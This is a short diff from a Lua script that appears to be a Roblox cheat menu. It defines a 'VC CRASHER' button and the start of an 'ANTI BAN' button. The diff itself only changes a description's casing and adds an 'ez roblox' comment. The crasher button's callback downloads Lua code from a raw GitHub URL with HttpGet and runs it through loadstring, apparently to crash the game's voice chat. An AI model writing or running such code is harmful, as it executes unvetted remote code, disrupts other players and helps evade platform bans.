@@ -667,13 +667,13 @@ task.spawn(StartSequence)
 
 local IYAdmin = Tabs.Player:AddButton({
     Title = "VC CRASHER",
-    Description = "CRASHES VC",
+    Description = "Crashes Vc",
 
     Callback = function()
+-- ez roblox
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Rootleak/Stalkie-2.0/refs/heads/main/vc.lua"))()
     end
 })
-
 
 local IYAdmin = Tabs.Player:AddButton({
     Title = "ANTI BAN",
